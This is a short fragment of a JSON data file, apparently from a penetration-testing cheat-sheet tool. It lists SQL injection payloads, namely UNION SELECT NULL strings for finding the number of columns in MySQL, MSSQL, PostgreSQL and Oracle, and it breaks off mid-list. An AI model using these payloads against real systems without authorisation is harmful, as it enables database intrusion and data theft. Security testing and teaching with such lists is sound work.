  {
    "name": "SQL Injection",
    "value": "sqli",
    "sections": [
        {
            "title": "Number of column",
            "items": [
                { "subtitle": "MySQL/MSSQL/PGSQL", "content": "'UNION SELECT NULL,NULL,NULL -- -" },
                { "subtitle": "ORACLE", "content": "'UNION SELECT NULL,NULL,NULL FROM DUAL -- -" },
